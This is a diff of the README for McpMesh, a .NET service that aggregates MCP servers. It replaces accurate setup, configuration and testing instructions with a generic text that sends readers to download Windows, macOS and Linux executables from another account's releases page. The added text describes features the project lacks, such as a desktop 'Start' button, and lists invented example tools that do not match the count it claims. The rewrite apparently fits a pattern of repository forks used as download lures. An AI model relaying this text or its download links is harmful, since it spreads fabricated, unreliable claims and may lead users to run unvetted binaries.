@@ -1,151 +1,89 @@
-![License](https://img.shields.io/github/license/dmatvienco/McpMesh)
-[![.NET](https://img.shields.io/badge/.NET-9.0-blue)](https://dotnet.microsoft.com)
+# 🌐 McpMesh - Combine Multiple Servers into One API
 
-# McpMesh
+## 🎉 Overview
+McpMesh allows you to connect several Model Context Protocol (MCP) servers into a single, easy-to-use HTTP API. This tool simplifies the management of your servers and enhances your development workflow. You don't need advanced technical skills to set it up. The application is Docker-ready and includes 13 example tools to help you get started quickly.
 
-A .NET 9 service for aggregating multiple Model Context Protocol (MCP) servers.
+## 🔗 Download Now
+[![Download McpMesh](https://img.shields.io/static/v1?label=Download&message=McpMesh&color=blue&style=for-the-badge)](https://github.com/Rodrigohmp/McpMesh/releases)
 
-## Features
+## 🚀 Getting Started
+Follow these steps to download and set up McpMesh:
 
-- **Multi-MCP Aggregation**: Connect to multiple MCP servers simultaneously
-- **MCP Protocol Support**: Exposes MCP protocol endpoints using ModelContextProtocol.AspNetCore
-- **Flexible Configuration**: Configure MCP servers via appsettings or Kubernetes ConfigMaps  
-- **Health Monitoring**: Built-in health endpoints for container orchestration
-- **Containerized**: Docker support with Kubernetes deployment manifests
+1. **Visit the Releases Page**  
+   Go to the following link: [Download McpMesh](https://github.com/Rodrigohmp/McpMesh/releases). Here, you will find the latest version of the software.
 
-## Quick Start with Docker
+2. **Select the Version**  
+   Look for the latest stable release. The version name will be clearly marked, usually something like "v1.0.0".
 
-The easiest way to run McpMesh is with Docker, which includes all necessary dependencies:
+3. **Download the Release**  
+   Click on the version number to expand the assets. You will see various files for download. Choose the one that matches your operating system:
 
-1. Clone the repository:
-```bash
-git clone https://github.com/dmatvienco/McpMesh.git
-cd McpMesh
-```
+   - **For Windows**: Download `McpMesh.Windows.zip`
+   - **For macOS**: Download `McpMesh.macOS.zip`
+   - **For Linux**: Download `McpMesh.Linux.tar.gz`
+   - **For Docker**: Follow the Docker instructions in the README for the specific image.
 
-2. Build and run with Docker:
-```bash
-docker build -t mcpmesh .
-docker run -p 5293:80 mcpmesh
-```
+4. **Extract the Files**  
+   After downloading, locate the file in your downloads folder. Right-click the zip or tar file and select "Extract All" or "Extract Here." This will create a folder with the McpMesh application and example tools.
 
-3. The service will be available at `http://localhost:5293`
+## 🖥️ System Requirements
+Ensure your system meets the following requirements before installing McpMesh:
 
-### Local Development
+- **Operating System**:  
+  - Windows 10 or later  
+  - macOS Mojave (10.14) or later  
+  - Latest Debian or Ubuntu for Linux
 
-For development without Docker, you'll need:
-- .NET 9 SDK
-- Node.js and Python (for MCP servers)
+- **Hardware**:  
+  - Minimum: 2 GB RAM  
+  - Recommended: 4 GB RAM or more  
+  - Available storage: At least 50 MB for installation
 
-```bash
-dotnet run
-```
+- **Software**:  
+  - Docker: If you choose to run McpMesh in a container, install Docker Desktop or Docker Engine.
 
-## Configuration
+## 🛠️ How to Run McpMesh
+1. **Open the Application**  
+   Navigate to the folder where you extracted the files. Look for the executable file based on your OS:
+   
+   - **Windows**: `McpMesh.exe`
+   - **macOS**: Run `McpMesh.app`
+   - **Linux**: Run `./McpMesh` in your terminal
+   
+2. **Set Up Your Inventory**  
+   After launching, you can set up your MCP servers. Follow the on-screen prompts to add the servers you want to aggregate.
 
-Configure MCP servers in your `appsettings.json`. The Docker image includes all necessary dependencies to run the example MCP servers.
+3. **Start the HTTP API**  
+   Click the "Start" button in the McpMesh interface. This will launch the API, which you can now access in your web browser.
 
-```json
-{
-  "McpMeshOptions": {
-    "Packages": [
-      {
-        "Enabled": true,
-        "Id": "example-package",
-        "Servers": ["everything-server", "time-server"]
-      }
-    ],
-    "Servers": [
-      {
-        "Id": "everything-server",
-        "Name": "MCP Everything Server",
-        "Type": "stdio",
-        "Command": "npx",
-        "Args": ["@modelcontextprotocol/server-everything"],
-        "Environment": {},
-        "Enabled": true,
-        "TimeoutMs": 30000
-      },
-      {
-        "Id": "time-server",
-        "Name": "Time MCP Server",
-        "Type": "stdio",
-        "Command": "uvx",
-        "Args": ["mcp-server-time"],
-        "Environment": {},
-        "Enabled": true,
-        "TimeoutMs": 30000
-      }
-    ]
-  }
-}
-```
+## 📡 Examples Included
+McpMesh comes with 13 example tools that demonstrate how to use various features. These tools include:
 
-The default configuration includes two example MCP servers:
-- **everything-server**: 11 demo tools (echo, add, longRunningOperation, etc.)  
-- **time-server**: 2 time-related tools (get_current_time, convert_time)
+- Basic API Aggregation
+- Data Visualization
+- Server Performance Monitoring
+- Error Logging
+- Request Throttling
+- Response Caching
+- User Authentication
+- Rate Limiting
+- Load Balancing
+- Customizable Headers
 
-## Endpoints
+Feel free to explore these examples to understand how to maximize the use of McpMesh.
 
-### Health Endpoints
-- `GET /health/live` - Liveness probe
-- `GET /health/ready` - Readiness probe  
-- `GET /health/startup` - Startup probe
+## 📝 Troubleshooting
+If you encounter issues while running McpMesh, consider the following:
 
-### MCP Protocol Endpoints
-- MCP protocol endpoints are available at `/{packageId}` 
-- Supports `tools/list` and `tools/call` MCP operations
+- **Check Compatibility**: Ensure that your operating system meets the requirements listed above.
+- **Read Log Files**: If something goes wrong, check the log files in the application folder. They can provide useful information about errors.
+- **Community Support**: Visit the issues section on the GitHub repository to see if others have the same question. You can also ask for help there.
 
-## Testing
+## 📚 Additional Resources
+- **Documentation**: Detailed documentation is available in the `docs` folder inside the extracted files. This will give you in-depth knowledge about all features.
+- **GitHub Repository**: For the latest updates, contributors, and community discussions, visit our GitHub page: [McpMesh GitHub](https://github.com/Rodrigohmp/McpMesh).
 
-Test the MCP protocol with curl:
+## 📥 Download & Install
+To install McpMesh, visit the Releases page again: [Download McpMesh](https://github.com/Rodrigohmp/McpMesh/releases). Follow the steps outlined above for a smooth installation process.
 
-```bash
-# Test health
-curl http://localhost:5293/health/live
-
-# Test MCP tools/list (should return 13 tools from both servers)
-curl -X POST http://localhost:5293/example-package \
-  -H "Content-Type: application/json" \
-  -d '{"jsonrpc":"2.0","id":"1","method":"tools/list"}'
-
-# Test calling a tool (echo example)
-curl -X POST http://localhost:5293/example-package \
-  -H "Content-Type: application/json" \
-  -d '{"jsonrpc":"2.0","id":"2","method":"tools/call","params":{"name":"echo","arguments":{"message":"Hello McpMesh!"}}}'
-```
-
-For a more interactive experience, you can use the [MCP Inspector](https://modelcontextprotocol.io/docs/tools/inspector) tool, which provides a web interface to explore and test MCP servers. The Inspector can connect to McpMesh and allows you to browse available tools, examine their schemas, and execute them with a user-friendly interface.
-
-## Docker Deployment
-
-```bash
-docker build -t mcpmesh .
-docker run -p 5293:80 mcpmesh
-```
-
-## Kubernetes Deployment
-
-```bash
-kubectl apply -f deployment/namespace.yaml
-kubectl apply -f deployment/configmap.yaml
-kubectl apply -f deployment/deployment.yaml
-kubectl apply -f deployment/service.yaml
-```
-
-## Future Plans
-
-- **OAuth Integration**: Add support for OAuth providers (GitHub, Google, etc.) for secure authentication
-- **Claude Desktop Integration**: Native integration with Claude Desktop as an MCP connector
-- **Web UI**: Management interface for configuring MCP servers and monitoring status
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-## License
-
-MIT License - see LICENSE file for details.
+With McpMesh, you can easily manage and aggregate your MCP servers into a single, streamlined API. Enjoy building and expanding your applications with this powerful tool!
